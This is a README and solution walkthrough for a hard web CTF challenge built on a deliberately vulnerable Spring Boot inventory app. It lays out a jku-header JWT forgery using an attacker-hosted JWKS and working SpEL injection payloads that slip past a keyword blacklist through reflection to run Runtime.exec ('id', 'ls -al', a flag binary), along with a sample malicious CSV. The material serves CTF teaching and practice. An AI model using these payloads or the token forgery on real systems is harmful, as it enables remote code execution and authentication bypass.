# MarketNest - SpEL Injection CTF Challenge

Category: Web | Difficulty: Hard | Stack: Java 17, Spring Boot 3, Thymeleaf

## Story

MarketNest is a B2B inventory management SaaS for small retailers. The
operations workspace gives store owners a catalog, stock overview, order
feed, order creation, and activity summary. A separate pricing workspace can bulk-upload a
product catalog via CSV instead of entering items one by one. As a convenience, the import tool supports a
"pricing formula" column: instead of typing a fixed price, an admin can write
something like `basePrice * 0.9` for a 10% markdown, and the system computes
it automatically during import.

The bug: instead of a sandboxed math-expression evaluator, the formula column
is fed directly into Spring's `SpelExpressionParser` against a
`StandardEvaluationContext`, which permits full method invocation, reflection
and type access - i.e. arbitrary code execution, not just arithmetic. A naive
keyword blacklist (`runtime`, `processbuilder`) blocks the most obvious
copy-pasted payloads but doesn't inspect the parsed expression tree, so it's
defeated by string concatenation / reflection.

Players receive a running black-box instance - no source - and must create
their own retailer account. The normal workspace contains a believable
catalog, order feed, stock metrics, and product views. Login issues an
RSA-signed JWT, but the verifier trusts the unvalidated `jku` header when
choosing the verification key. This allows a player to host a malicious JWKS,
forge an administrator token, and reveal the otherwise hidden Pricing Studio.
The flag is encoded inside the native executable
`/app/flagbinary`; it is not available as a readable text file. The intended
solve then requires command execution, discovering the binary with `ls -al`,
and executing it to send the flag to stdout.

## Running it

```bash
docker build -t priceforge-ctf .
docker run --read-only --cap-drop=ALL \
  --security-opt no-new-privileges:true \
  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m \
  -p 8088:8080 priceforge-ctf
```

The included `compose.yaml` applies the same runtime restrictions. The
container has no writable filesystem layer, runs as the unprivileged
`ctfuser`, and keeps the application directory root-owned. RCE can still
list directories, inspect metadata, read files, and execute the flag helper,
but filesystem writes, deletes, moves, chmod, and mkdir operations against
the application filesystem fail. `/tmp` is an isolated runtime tmpfs required
by embedded Tomcat; it is `noexec`, has no setuid/device support, and is not
part of the application or flag filesystem.

Or locally with Maven:
```bash
mvn spring-boot:run
```
The full flag path is exercised by the Docker build, which compiles and
installs the native helper.

Then visit `http://localhost:8088/login`.

The encoded flag bytes live in `src/main/c/priceforge_flag.c`; replace them
before any real deployment.

## Local test checklist

1. Start Docker Desktop and build the image:

   ```bash
   docker build -t priceforge-ctf .
   docker run --rm --read-only --cap-drop=ALL \
     --security-opt no-new-privileges:true \
     --tmpfs /tmp:rw,noexec,nosuid,nodev,size=64m \
     -p 8088:8080 priceforge-ctf
   ```

2. Open `/signup`, create any account with a password of at least eight
   characters, then log in.
3. Confirm the normal retailer JWT opens a believable workspace dashboard
   with catalog, stock, and order data. The elevated pricing workspace is not
   advertised to this role.
4. Use Burp Suite or an equivalent proxy to forge a new RS256 token: host the
   matching attacker public JWK at a `jku` URL you control, set `kid` to match,
   and sign the token with your private key. Set the forged claim `role` to
   `admin`.
5. Replace the `pf_token` cookie and revisit `/dashboard`. The verified admin
   identity reveals the otherwise hidden Pricing Studio entry, which leads to
   the CSV import and later SpEL stages.

## Stage-by-stage flow and verification

### Stage 1 - Account creation and JWT inspection
Create an account through `/signup`, then log in normally. The application
sets an `HttpOnly` `pf_token` cookie containing an `RS256` JWT. Decode the
token and inspect its header: it contains the normal `alg`, `typ`, and `kid`
fields, but no attacker-controlled key URL. The token identifies the new
account as a retailer.
*Verify:* the normal token loads the ordinary dashboard and does not expose
the pricing workspace.

### Stage 2 - JKU authorization bypass
Generate an RSA key pair and publish the public key as a JWK Set on a server
you control:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "n": "ATTACKER_MODULUS",
      "e": "AQAB"
    }
  ]
}
```

Forge the JWT by adding a `jku` header pointing to the hosted JWKS URL and its
`kid` to `attacker-key`. Preserve the issuer and expiry, change the claims to
include `role: admin`, and sign the token with the matching private key. Replace
the `pf_token` cookie and request `/dashboard` again.
*Verify:* the forged token is accepted and the subtle Pricing Studio entry
appears on the ordinary dashboard.

### Stage 3 - Discovery
Explore the ordinary workspace first. `/catalog` shows product records and
stock levels, `/orders` shows recent customer activity and lets a retailer
create an order, and `/dashboard` shows the operational summary. Creating an
order reserves stock and adds a processing order to the feed. After the
JKU-forged admin identity is
accepted, a subtle "Pricing Studio" entry appears; use it to find the bulk
import workflow, download the sample CSV, and notice the `priceFormula`
column.
*Verify:* a retailer can use the catalog and orders pages, while `/import`
redirects back to the dashboard until the elevated identity is present.

### Stage 4 - Confirm evaluation
Upload a row with `priceFormula = 7*7`. The preview table should show a
computed price of `49.0` for that row - confirming server-side evaluation,
not just string storage.

### Stage 5 - Fingerprint the engine
Try a string-method payload a plain math library wouldn't support, e.g.
`'abc'.length()`. It evaluates successfully and returns `3`, confirming a
full expression language (SpEL) rather than arithmetic-only parsing.

### Stage 6 - Filter bypass
A naive payload like `T(java.lang.Runtime).getRuntime().exec('id')` is
rejected with `ERROR: Formula rejected: blocked pattern 'runtime'`.
Bypass by avoiding the literal substring "runtime" via string concatenation
and reflection instead of the `T()` operator:

```
(''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('id')
```

This resolves `java.lang.Runtime` via `Class.forName(...)` built from
concatenated string literals (never a contiguous "runtime" substring in the
raw formula text), fetches the static `getRuntime()` method the same way,
invokes it, then calls `.exec()` directly on the resulting object (SpEL
resolves the method dynamically against the object's runtime type).

### Stage 7 - Binary discovery and flag exfiltration
The flag is not stored in `/flag.txt` or another readable text file. The
container starts in `/app`, where the executable `flagbinary` is discoverable
with `ls -al`. The import preview's "Computed Price" column is
the only feedback channel - there's no console/stdout shown anywhere. First
use the RCE to return a directory listing, then execute the discovered binary
and chain a `Scanner` onto its output stream so the *return value* of the
expression is what's displayed:

Directory discovery formula:

```
new java.util.Scanner((''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('ls -al').getInputStream()).useDelimiter('\A').next()
```

Once `flagbinary` is visible, use:

```
new java.util.Scanner((''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('./flagbinary').getInputStream()).useDelimiter('\A').next()
```

Put this formula in a CSV row and upload it; the flag appears directly in
the "Computed Price" cell for that row.

Sample malicious CSV:
```
name,basePrice,stock,priceFormula
Exploit,1,1,"new java.util.Scanner((''.getClass().forName('ja'+'va.lang.Run'+'time').getMethod('get'+'Run'+'time').invoke(null)).exec('./flagbinary').getInputStream()).useDelimiter('\A').next()"
```

## Design notes for the author

- User accounts, RSA signing keys, catalogs, and orders are in memory, so a
  fresh container starts empty and restarts invalidate existing tokens and
  workspace changes.
- Catalogs and orders are partitioned by the authenticated JWT subject. The
  order form and CSV import use one-time session CSRF tokens, and the token
  cookie is `HttpOnly` with `SameSite=Lax` and `Secure` enabled on HTTPS.
- New order identifiers are random rather than sequential, and a consumed
  form token prevents accidental duplicate submissions.
- The runtime image is intended to be launched read-only with all Linux
  capabilities dropped and `no-new-privileges`. This deliberately limits the
  RCE primitive to read/list/execute behavior; the flag helper is root-owned
  and executable by `ctfuser` but cannot be modified.
- The `jku` verifier intentionally accepts any HTTP(S) URL and performs no
  trusted-host or issuer-key allowlisting. The deployed challenge must allow
  the target container to fetch the player's hosted JWKS.
- The blacklist only blocks two literal substrings on purpose - it's meant
  to feel like a real (if naive) developer fix, not an impenetrable WAF.
  Players who go straight to file-read tricks without touching
  `Runtime`/`ProcessBuilder` at all will bypass stage 4 without realizing
  there was a filter - that's an acceptable unintended path; the intended
  write-up above is the one to publish.
- `exec` and `getClass`/`forName` are deliberately NOT blacklisted since
  they're required for the intended bypass technique.
- Double-check the container's runtime image includes `ls` (the
  `eclipse-temurin:17-jre` base image does, since it's Debian-based).
- Consider rotating the blacklist slightly between events (e.g. also
  blocking `exec`) if you want to force the harder `ProcessBuilder`-free,
  `Runtime`-free... fully reflective route as a "hard mode" variant.






